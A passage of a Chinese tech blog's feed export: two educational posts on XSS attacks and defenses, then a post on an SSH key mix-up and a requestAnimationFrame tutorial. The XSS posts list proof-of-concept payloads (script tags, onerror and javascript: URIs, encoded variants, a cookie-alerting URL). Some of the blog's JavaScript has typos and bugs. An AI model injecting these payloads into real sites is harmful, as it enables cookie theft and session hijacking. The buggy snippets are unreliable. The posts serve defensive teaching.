class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>这段JavaScript验证代码要求用户输入的必须是020-开头，后跟8位数字.</p><blockquote><p>但是需要特别注意的是，<em>仅仅在客户端进行非法输入的验证和检测是远远不够的</em>，因为客户端组件和用户输入不在服务器的控制范围内，用户能够完全控制客户端及提交的数据，比如firebug、TemperDate之类的工具，拦截应用程序收到和发布每一个HTTP/HTTPS请求和响应，对其进行修改和检查，从而绕过客户端的检验将信息提交到服务器中。因此，确认客户端生成数据的唯一安全方法就是在服务端实施保护措施。</p></blockquote><h2 id="输出编码Xss-Escape"><a href="#输出编码Xss-Escape" class="headerlink" title="输出编码Xss Escape"></a>输出编码Xss Escape</h2><p>有时候我们又不可避免的需要用户输入一些特殊字符，但是我们又不确定用户输入的这段含特殊字符的数据是不是恶意的含xss的字符，为了保证用户输入的完整性和正确性，就可以使用编码（HTMLEncode）进行处理。</p><p>HTML编码在防止xss攻击上能起很大的作用，它主要使用对应的实体代替HTML字符，让该字符作为其HTML文档的内容而非结构加以处理。</p><table><thead><tr><th align="center">显示</th><th align="center">实体名字</th><th align="center">实体编号</th></tr></thead><tbody><tr><td align="center"><code>&lt;</code></td><td align="center"><code>&amp;lt;</code></td><td align="center"><code>&amp;#60;</code></td></tr><tr><td align="center"><code>&gt;</code></td><td align="center"><code>&amp;gt;</code></td><td align="center"><code>&amp;#62;</code></td></tr><tr><td align="center"><code>&amp;</code></td><td align="center"><code>&amp;amp;</code></td><td align="center"><code>&amp;#38;</code></td></tr><tr><td align="center"><code>&quot;</code></td><td align="center"><code>&amp;quot;</code></td><td align="center"><code>&amp;#34;</code></td></tr></tbody></table><p>上面就是几个可能触发xss的敏感字符，都是一些特殊的HTML字符。都这些字符实现编码和转义后，能够有效地防范HTML注入和XSS攻击</p><p>例如php的<code>htmlspecialchars()</code>库函数，就能够将用户输入的特殊字符进行实体转换：</p><ul><li><code>&lt;</code> 转成 <code>&amp;lt;</code></li><li><code>&gt;</code> 转成 <code>&amp;gt;</code></li><li><code>&amp;</code> 转成 <code>&amp;amp;</code></li><li><code>&quot;</code> 转成 <code>&amp;quot;</code></li><li><code>&#39;</code> 转成 <code>&amp;#39;</code></li></ul><p>实际情况中，我们可以结合这两种情况进行过滤<br><img alt="安全的过滤形式" data-src="/assets/images/xss-encode02.png" class="lazyload"></p><h1 id="3-Xss漏洞检测Poc"><a href="#3-Xss漏洞检测Poc" class="headerlink" title="3.Xss漏洞检测Poc"></a>3.Xss漏洞检测Poc</h1><p>标准的xss漏洞检测代码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>img 图片标记属性跨站攻击代码</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"javascript:alert(/xss/)"</span>&gt;&lt;/img&gt; &lt;img <span class="attribute">dynsrc</span>=<span class="string">"javascript:alert('xss')"</span>&gt;</span><br></pre></td></tr></table></figure><p>无需 “&lt;&gt;”，利用 html 标记事件属性跨站</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">""</span> <span class="attribute">onerror</span>=alert("xss")&gt;</span><br></pre></td></tr></table></figure><p>空格与回车符转换</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"Jav&amp;#x09;ascript:alert('xss')"</span>&gt; &lt;img <span class="attribute">src</span>=<span class="string">"Jav&amp;#x0A;ascript:alert('xss')"</span>&gt; &lt;img <span class="attribute">src</span>=<span class="string">"Jav&amp;#x0D;ascript:alert('xss')"</span>&gt;</span><br></pre></td></tr></table></figure><p>10 进制转换</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"&amp;#74&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#120&amp;#115&amp;#115&amp;#39&amp;#41"</span>&gt;</span><br></pre></td></tr></table></figure><p>以上代码都可以做 Poc 使用，在有变量的位置插入，如果成功执行则代表有漏洞。<br>只要你提交的Poc，服务端原封不动的返回了，说明服务端不经过任何处理就显示了，就证明有漏洞存在。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://book.douban.com/subject/25711796/" target="_blank" rel="noopener">《XSS跨站脚本剖析与防御》–邱永华</a><br><a href="https://book.douban.com/subject/10546925/" target="_blank" rel="noopener">《白帽子讲web安全》–吴翰清</a><br><a href="https://blog.csdn.net/gitchat/article/details/78726803" target="_blank" rel="noopener">《Web 安全：前端攻击 XSS 深入解析》</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;上次介绍了什么是XSS以及XSS的三种类型，作为上次小尾巴的总结来说：XSS跨站脚本是一种经常出现在web应用程序中的计算机安全漏洞，是由于web应用程序对于用户的输入过滤不足引起的。攻击者利用网站漏洞把恶意脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，轻者能达到恶作剧的目的，重者可以对受害者采取cookie资料窃取，会话劫持，钓鱼欺骗等各种攻击；分为三种类型，服务端的存储型和反射性，客户端自身漏洞引起的DOM型。这次我简单总结一些常见的攻击对应的防御措施，方便以后学习回顾;&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="https://www.chenqaq.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB安全" scheme="https://www.chenqaq.com/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>web安全-浅谈xss攻防（一）</title>
    <link href="https://www.chenqaq.com/2018/10/09/xss-attack-defense-md/"/>
    <id>https://www.chenqaq.com/2018/10/09/xss-attack-defense-md/</id>
    <published>2018-10-09T05:59:50.000Z</published>
    <updated>2020-07-23T04:13:38.774Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近来反反复复读了一些xss和csrf攻防的一些文章，大体上读完了《XSS跨站脚本剖析与防御》这本书，之前浅浮的以为xss仅仅需要对用户输入内容进行过滤，然而现在重新审视xss的攻击技巧着实令人眼花缭乱。</p><p>那到底什么是xss跨站脚本呢？它会造成什么危害？为何它如此流行？它的攻击方式有哪些？作为web开发人员我们应该做的有哪些？</p><p>带着这几个问题，反复测试总结了这篇文章，一方面方便自己以后学习回顾，另一方面希望可以帮助到一些想对xss攻防有些了解的人，我相信这篇文章能够帮你理解上面几个问题。想要深入学习，建议还是去学习<a href="https://read.douban.com/ebook/12812565/" target="_blank" rel="noopener">《xss跨站脚本剖析与防御》</a>，这本书是邱永华先生所著，阿里首席安全研究员吴翰清作的序，细细读来定能有所收获；</p><a id="more"></a><h1 id="XSS背景与介绍"><a href="#XSS背景与介绍" class="headerlink" title="XSS背景与介绍"></a>XSS背景与介绍</h1><h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h2><p>随着互联网的发展，web2.0时代的兴起，带来的交互模式的发展，现如今更是向融合人工智能的web3.0发展。目前的网站绝大多数都有需要和用户交互的功能，比如电商网站的评论，论坛的发帖，微博网站的转发等等。</p><p>正常用户会中规中矩的使用，但是对于黑客他们也许不会循规蹈矩，他们可以通过这些表单提交一些恶意代码，通常是JavaScript（但是绝对不限与此，也包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML）一旦攻击成功后，攻击者可能获得更高的权限（可能的一些操作）、私密的网页内容、会话和cookie等等</p><p>不过目前现代浏览器比如chrome，firefox对于表单中的代码会自动检测出xss，从而屏蔽请求，但仍然不是绝对安全的，与此同时不乏有一些浏览器如IE6,7,8并不会做这样的处理，亲测如此；chrome的xss过滤器叫做xssAuditor，IE的xss过滤xssFilter从IE8 beta2才开始，所以IE8及以下的浏览器不会做xss过滤处理，关于xssAuditor和xssFilter两者的区别，吴翰清大神所著的《白帽子讲web安全》有详细的介绍，</p><blockquote><p>作为扩展简单的说，ie的xss检测相对粗暴，在系统盘的mshtml.dll中，是基于正则进行检测的；<br>而chrome的xssAuditor的整合在webkit中，任何使用webkit内核的都可以使用这些规则，在词法解析阶段进行，和html解析不同的token，xssAuditor会逐一扫描并检测token，token中发现危险的属性和URL进行比较，如果URL中也存在同样的数据，xssAuditor则会认为是一个反射型xss。</p></blockquote><p>下面通过一个很简单的栗子说明：textarea中的一段<code>&lt;script&gt;alert(/XSS/)&lt;/script&gt;</code>很简单的恶意代码，如果前后端和浏览器的xss检测都跳过，那么这段代码就会伴随请求被上传到漏洞服务器或者客户端中，站点从数据库中或者客户端读取恶意用户存入的非法数据，然后显示在页面，在受害者主机上的浏览器执行恶意代码，那么这个xss就会成功（其实就是让用户打开这个页面弹个屏的小恶作剧），但是这里就如同上面说的那样chrome的xssAuditor帮我们检测出了异常代码，从而拦截了这个网页，阻止了这个恶作剧的发生，我们把这种注入到服务器或者客户端的恶意代码的xss攻击方式称为持久性（又叫存储型）XSS</p><p><video src="https://www.chenqaq.com/assets/videos/xss01.mp4" controls allowfullscreen="true" loop="true" autoplay="autoplay" width="100%" min-height="100%">embed: xss–chrome_test</video></p><h2 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h2><p>根据攻击的来源不同，我们通常分为三种：反射型，存储型和比较特殊的DOM型（DOM-Based XSS）</p><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>反射型：反射性通常发生在URL地址的参数中，常用来窃取客户端的cookie或进行钓鱼欺骗，经常在网站的搜索栏，跳转的地方被注入；<br>比如：</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">http://www.test.<span class="keyword">com</span>/<span class="built_in">search</span>.php?key=<span class="string">"&gt;&lt;script&gt;alert("</span>XSS<span class="comment">")&lt;/script&gt;</span></span><br><span class="line">http://www.test.<span class="keyword">com</span>/logout.asp?out=<span class="keyword">l</span>$url=javascrip<span class="variable">t:alert</span>(document.cookie)</span><br></pre></td></tr></table></figure><p>我们发现URL后本来应该是正常的键值对key=value，却被注入了一段恶意代码（即构造了一个其中包含恶意代码的特殊的url），应该慎用get请求，对隐秘的信息则是避免，get请求的键值会被暴露在URL中；POST的内容也会触发反射型XSS，不过触发条件相对苛刻。</p><p>当然如果地址栏看到上面两个URL，可能被轻易的看穿该链接是不可信的，但是绝不要小瞧此类XSS的威力，一般黑客都会进行精心布置，恶意URL暴露一般会进行各种编码转化，编码转换后，攻击的迷惑性大大提高<br><img alt data-src="https://www.chenqaq.com/assets/images/xss-encode01.png" class="lazyload"></p><h3 id="持久型（又叫存储型）"><a href="#持久型（又叫存储型）" class="headerlink" title="持久型（又叫存储型）"></a>持久型（又叫存储型）</h3><p>我们上面提到的栗子就是一个持久型xss的示例，可以看处此类xss攻击不需要用户去点击URL进行触发，提前将恶意代码保存在了漏洞服务器或者客户端中，站点取出后会自动解析执行，相比反射型更具有攻击性，通常发生在网站的留言，评论，博客日志等交互处。</p><p>黑客可以利用它渗透网站、挂马、钓鱼…还有危害更大的xss蠕虫，跨站蠕虫用AJAX/JAVASCRIPT脚本语言编写的蠕虫病毒，可以在站点间实现病毒几何数级传播。</p><h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>相比以上两种攻击类型，DOM型比较特殊，DOM型取出和执行恶意代码都由浏览器端完成，属于前端自身安全漏洞。主要由客户端的脚本通过DOM动态地输出到页面中，它不依赖于提交到服务器端，而从客户端获得DOM中的数据在本地执行.<br>举个栗子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> temp = <span class="built_in">document</span>.URL;</span><br><span class="line"><span class="keyword">let</span> index = temp.indexOf(<span class="string">"content"</span>) + <span class="number">4</span>;</span><br><span class="line"><span class="keyword">let</span> par = temp.substring(index);</span><br><span class="line"><span class="built_in">document</span>.write(decodeURL(par));</span><br></pre></td></tr></table></figure><p>如果用户点击了带有下面链接的跳转，就会触发XSS漏洞</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//www.test.com/dom.html?content=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>更多XSS攻击方式可以关注xss cheat sheet，会看到很多常见的xss攻击脚本列表，可以作为Poc用来检测web应用程序是否存在xss漏洞</p><h1 id="续集"><a href="#续集" class="headerlink" title="续集"></a>续集</h1><p>web安全-浅谈xss攻防（二）：更多的关注整理一些防御措施</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://book.douban.com/subject/25711796/" target="_blank" rel="noopener">《XSS跨站脚本剖析与防御》–邱永华</a><br><a href="https://book.douban.com/subject/10546925/" target="_blank" rel="noopener">《白帽子讲web安全》–吴翰清</a><br><a href="https://juejin.im/post/5bad9140e51d450e935c6d64" target="_blank" rel="noopener">《前端安全系列:如何防止XSS攻击？》–美团技术团队</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;近来反反复复读了一些xss和csrf攻防的一些文章，大体上读完了《XSS跨站脚本剖析与防御》这本书，之前浅浮的以为xss仅仅需要对用户输入内容进行过滤，然而现在重新审视xss的攻击技巧着实令人眼花缭乱。&lt;/p&gt;
&lt;p&gt;那到底什么是xss跨站脚本呢？它会造成什么危害？为何它如此流行？它的攻击方式有哪些？作为web开发人员我们应该做的有哪些？&lt;/p&gt;
&lt;p&gt;带着这几个问题，反复测试总结了这篇文章，一方面方便自己以后学习回顾，另一方面希望可以帮助到一些想对xss攻防有些了解的人，我相信这篇文章能够帮你理解上面几个问题。想要深入学习，建议还是去学习&lt;a href=&quot;https://read.douban.com/ebook/12812565/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《xss跨站脚本剖析与防御》&lt;/a&gt;，这本书是邱永华先生所著，阿里首席安全研究员吴翰清作的序，细细读来定能有所收获；&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="https://www.chenqaq.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB安全" scheme="https://www.chenqaq.com/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>linux下误将ssh密钥写入/root</title>
    <link href="https://www.chenqaq.com/2018/10/05/linux-ssh-addToGithub-md/"/>
    <id>https://www.chenqaq.com/2018/10/05/linux-ssh-addToGithub-md/</id>
    <published>2018-10-05T04:05:37.000Z</published>
    <updated>2020-07-23T04:13:38.772Z</updated>
    
    <content type="html"><![CDATA[<p>无论是使用github类似的开源平台还是搭建的git服务器来团队协作开发，我们总是需要使用本地ssh密钥来建立连接，如果要使用ssh服务linux下我们还需要通过终端安装ssh并且开启ssh服务</p><a id="more"></a><h1 id="一-关于ssh密钥"><a href="#一-关于ssh密钥" class="headerlink" title="一.关于ssh密钥"></a>一.关于ssh密钥</h1><p>首先应该检查下是否存在ssh密钥，<br>终端键入<code>ls -ah</code>查看是否存在.ssh文件，不存在则我们需要生成ssh密钥：<br>终端键入<code>ssh-keygen -t rsa -C &#39;you_email@email.com&#39;</code></p><p>回车之后下面是设置的密码，不设置回车即可。即：</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">Enter <span class="built_in">file</span> <span class="keyword">in</span> which <span class="built_in">to</span> save <span class="keyword">the</span> key (/home/.ssh/id_rsa): 【按回车】</span><br><span class="line"><span class="comment">/*这一步不需要修改名字，否则后面我们通过`ssh -T git@github.com`检测是否建立连接会失败，因为ssh默认会读取id_rsa这个公钥*/</span></span><br><span class="line">Enter passphrase (<span class="literal">empty</span> <span class="keyword">for</span> no passphrase): 【输入密码】</span><br><span class="line">Enter same passphrase again: 【再次输入密码】</span><br></pre></td></tr></table></figure><p>然后将.ssh/id_rsa.pub添加进去你github中ssh中即可</p><p>通过<code>sss -T git@github.com</code>检查连接是否建立成功，出现下面信息则提示已经建立连接喽</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">Hi username! You<span class="symbol">'ve</span> successfully authenticated, but GitHub does <span class="keyword">not</span> provide shell <span class="keyword">access</span>.</span><br></pre></td></tr></table></figure><p>然后回去观察你的github ssh and GpG keys的对应的ssh小钥匙灰色已经变成了绿色</p><h1 id="二-关于ssh服务"><a href="#二-关于ssh服务" class="headerlink" title="二.关于ssh服务"></a>二.关于ssh服务</h1><p>对于linux下安装ssh服务相关，这里我做了简单的整理：</p><h3 id="1-查看ssh服务的状态"><a href="#1-查看ssh服务的状态" class="headerlink" title="1.查看ssh服务的状态"></a>1.查看ssh服务的状态</h3><p>输入<code>sudo service sshd status</code>:<br>如果出现No such file or directory相关提示，说明还没有安装ssh服务<br>如果提示Active:inactive(dead)，则已经安装了ssh服务，但是没有开启</p><h3 id="2-安装ssh服务"><a href="#2-安装ssh服务" class="headerlink" title="2.安装ssh服务"></a>2.安装ssh服务</h3><p>因为linux发行版众多，有一些不同的安装方式<br>redhat，fedora，centos等系列linux发行版可以尝试：<br><code>sudo yum install sshd</code>或者<code>sudo yum install openssh-server</code><br>debian，ubuntu，linux mint等系列的linux发行版尝试：<br><code>sudo apt-get install sshd</code>或者<code>sudo apt-get install openssh-server</code></p><h3 id="3-开启ssh服务"><a href="#3-开启ssh服务" class="headerlink" title="3.开启ssh服务"></a>3.开启ssh服务</h3><p>在终端输入<code>sudo service sshd start</code><br>提示Active: active (running) since Sun 2018-10-5 13:43:11 CST; 15s ago则说明ssh服务已经启动成功</p><h3 id="4-卸载ssh服务"><a href="#4-卸载ssh服务" class="headerlink" title="4.卸载ssh服务"></a>4.卸载ssh服务</h3><p>和安装对应，我们可以使用<br><code>sudo yum remove sshd</code>和<code>sudo apt-get -purge remove sshd</code><br>来卸载ssh服务</p><h1 id="三-解决问题-Permission-denied"><a href="#三-解决问题-Permission-denied" class="headerlink" title="三.解决问题(Permission denied)"></a>三.解决问题(Permission denied)</h1><p>因为误通过sudo命令生成ssh密钥，导致ssh密钥写入了/root系统文件，而引发后来一系列问题<br>丢失了截图，在一次试错后：<br><img alt="请告诉我你的身份" data-src="https://www.chenqaq.com/assets/images/linux-ssh-error01.png" class="lazyload"><br>其实我安装git后已经设置了身份的，通过<code>git config --list</code>查看<br><img alt="git user config" data-src="https://www.chenqaq.com/assets/images/linux-ssh-user01.png" class="lazyload"><br>于是我很自然的先搁置这个问题，下面是Permission denied的报错：<br><img alt="Permission denied" data-src="https://www.chenqaq.com/assets/images/linux-ssh-error02.png" class="lazyload"><br>发现是权限问题，于是我反复检查，才发现自己误用了sudo命令，将ssh密钥写入了系统盘/root，导致权限不足，无法与远程建立连接。<br><img alt="误用sudo生成ssh密钥" data-src="https://www.chenqaq.com/assets/images/linux-ssh01.png" class="lazyload"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无论是使用github类似的开源平台还是搭建的git服务器来团队协作开发，我们总是需要使用本地ssh密钥来建立连接，如果要使用ssh服务linux下我们还需要通过终端安装ssh并且开启ssh服务&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://www.chenqaq.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://www.chenqaq.com/tags/Linux/"/>
    
      <category term="SSH" scheme="https://www.chenqaq.com/tags/SSH/"/>
    
  </entry>
  
  <entry>
    <title>requestAnimationFrame优化</title>
    <link href="https://www.chenqaq.com/2018/05/15/js-requestAnimationFrame-md/"/>
    <id>https://www.chenqaq.com/2018/05/15/js-requestAnimationFrame-md/</id>
    <published>2018-05-15T10:01:39.000Z</published>
    <updated>2020-07-23T04:13:38.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="requestAnimationFrame-是什么"><a href="#requestAnimationFrame-是什么" class="headerlink" title="requestAnimationFrame 是什么?"></a>requestAnimationFrame 是什么?</h2><p>在浏览器动画程序中，我们一般会使用定时器来循环每隔多少毫秒来移动物体一次，来使它产生动画的效果。requestAnimationFrame()函数是针对动画效果的 API，告诉浏览器您希望执行动画并请求浏览器在下一次重绘之前调用指定的函数来更新动画，可以把它用在 DOM 上的风格变化或 canvas 动画或 WebGL 中。</p><a id="more"></a><h2 id="requestAnimationFrame-相比定时器有哪些优势"><a href="#requestAnimationFrame-相比定时器有哪些优势" class="headerlink" title="requestAnimationFrame 相比定时器有哪些优势?"></a>requestAnimationFrame 相比定时器有哪些优势?</h2><p>那么问题就来了：CSS3 动画那么强，定时器同样可以完成一般的动画，我们为什么还需要 requestAnimationFrame()呢？</p><p>首先对于主流的 CSS3 动画来说，虽然一些主流浏览器都对它有比较好的支持，但是 ie8 以下（）是不支持的是其一，其二 CSS3 动画的运动轨迹比较少，有不小的局限性。</p><p>这时候我们会考虑到 JS，定时器使我们经常用到的方法，但是用定时器制作动画会发生【跳帧】问题，试想一下拥堵的高速公路上，最多每 16.7s 通过一辆车，结果突然插入一批 setinterval 的军车，强行要在 10s 通过。显然，这是超负荷的，想要顺利通过，只能让第三辆车军车直接消失。然而这是不现实的，于是就会堵车！</p><p>同样的，显示器 16.7ms<code>刷新间隔之前发生了其他的绘制的请求</code>（setTimeout），导致所有的第三帧丢失，继而导致动画断续显示，这就是过渡绘制带来的问题。这也是为何 setTimeout 的定时器值推荐最小使用<code>16.7ms</code>原因<code>（16.7 = 1000 / 60，即每秒60帧）</code></p><p>requestAnimationFrame 则会跟着浏览器的绘制走，如果浏览器设备的绘制间隔是 16.7ms，它就会 16.7ms 绘制；如果是 10ms，则会按 10ms 来绘制。这样就不会存在过度绘制的问题，动画不会掉帧。</p><h2 id="requestAnimationFrame-用法"><a href="#requestAnimationFrame-用法" class="headerlink" title="requestAnimationFrame 用法"></a>requestAnimationFrame 用法</h2><p>虽然说 CSS3 动画既方便又高效，但是对于 PC 端 IE8，9 之流，想要兼容某些动画效果，比如淡入淡出，该如何实现？一般情况下，IE10+我们使用 CSS3 实现，对于 IE9-之流，我们使用 setTimeout 实现。两套完全不同的 style.改下动画时间还要修改两处。requestAnimationFrame 跟 setTimeout 非常类似，都是单回调，用法也类似。</p><p>我们一般使用下面的兼容写法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.requestAnimFrame = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="built_in">window</span>.requestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.webkitRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.mozRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.oRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.msRequestAnimationFrame ||</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"><span class="regexp">/* function */</span> callback, <span class="regexp">/* DOMElement */</span> element</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">window</span>.setTimeout(callback, <span class="number">1000</span> / <span class="number">60</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">animloop</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  requestAnimFrame(animloop);</span><br><span class="line">  render();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h2><p><img alt="requestAnimationFrame兼容性" data-src="http://www.chenqaq.com/assets/images/CheckRequestAnimationFrame.jpg" class="lazyload"></p><p>主流浏览器都实现了 requestAnimationFrame 的支持，即使是 IE9-之流，通过一些优雅降级的方案，也可以做到不出错。</p><p>比如，Opera 浏览器的技术师 Erik Möller <a href="https://blogs.opera.com/news/" target="_blank" rel="noopener">把这个函数进行的封装</a>，使得它更好的兼容各种浏览器。<br>在 Erik Möller 标准函数的基础上加了兼容各种浏览器引擎的前缀。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> lastTime = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> vendors = [<span class="string">'webkit'</span>,<span class="string">'moz'</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> x=<span class="number">0</span>;x&lt;vendors.length &amp;&amp; !<span class="built_in">window</span>.requestAnimationFrame; ++x)&#123;</span><br><span class="line">        <span class="built_in">window</span>.requestAnimationFrame = <span class="built_in">window</span>[vendors[x] + <span class="string">'RequestAnimationFrame'</span>];</span><br><span class="line">        <span class="built_in">window</span>.cancelAnimationFrame  = <span class="built_in">window</span>[vendors[x] + <span class="string">'CancleAniamtionFrame'</span>] ||</span><br><span class="line">                                       <span class="built_in">window</span>[vendors[x] + <span class="string">'CancleRequestAnimationFrame'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">window</span>.requestAnimationFrame)&#123;</span><br><span class="line">        <span class="built_in">window</span>.requestAnimationFrame = <span class="function"><span class="keyword">function</span>(<span class="params">callback,element</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> currTime = <span class="keyword">new</span>.Date().getTime();</span><br><span class="line">            <span class="keyword">var</span> timeToCall = <span class="built_in">Math</span>.max(<span class="number">0</span>,<span class="number">16.7</span> - (currTime - lastTime));</span><br><span class="line">            <span class="keyword">var</span> id = <span class="built_in">window</span>.setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                callback(currTime + timeToCall);</span><br><span class="line">            &#125;,timeToCall);</span><br><span class="line">            lastTime = currTime + timeToCall;</span><br><span class="line">            <span class="keyword">return</span> id;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">window</span>.cancelAnimationFrame)&#123;</span><br><span class="line">        <span class="built_in">window</span>.cancelAnimationFrame = <span class="function"><span class="keyword">function</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">            clearTimeout(id);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>在使用 canvas 绘画时这个函数更加合适，能得到更好的效果。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.reqestAnimFrame = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">window</span>.requestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.webkitRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.mozRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.oRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.msRequestAnimationFrame ||</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">callback, element</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">window</span>.setTimeout(callback, <span class="number">1000</span> / <span class="number">60</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> canvas, context, toggle;</span><br><span class="line"></span><br><span class="line">init();</span><br><span class="line">animate();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  canvas = <span class="built_in">document</span>.createElement(<span class="string">"canvas"</span>);</span><br><span class="line">  canvas.height = <span class="number">512</span>;</span><br><span class="line">  canvas.width = <span class="number">512</span>;</span><br><span class="line"></span><br><span class="line">  context = cavnas.getContext(<span class="string">"2d"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(canvas);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">animate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  reqestAnimFrame(animate);</span><br><span class="line">  draw();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> time = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime() * <span class="number">0.002</span>;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="built_in">Math</span>.sin(time) * <span class="number">192</span> + <span class="number">256</span>;</span><br><span class="line">  <span class="keyword">var</span> y = <span class="built_in">Math</span>.cos(time * <span class="number">0.9</span>) * <span class="number">192</span> + <span class="number">256</span>;</span><br><span class="line">  toggle = !toggle;</span><br><span class="line"></span><br><span class="line">  context.fillStyle = toggle ? <span class="string">"rgb(200,100,20)"</span> : <span class="string">"rgb(20,20,100)"</span>;</span><br><span class="line">  context.beginPath();</span><br><span class="line">  context.arc(x, y, <span class="number">5</span>, <span class="number">0</span>, <span class="built_in">Math</span>.PI * <span class="number">2</span>, <span class="literal">true</span>);</span><br><span class="line">  context.closePath();</span><br><span class="line">  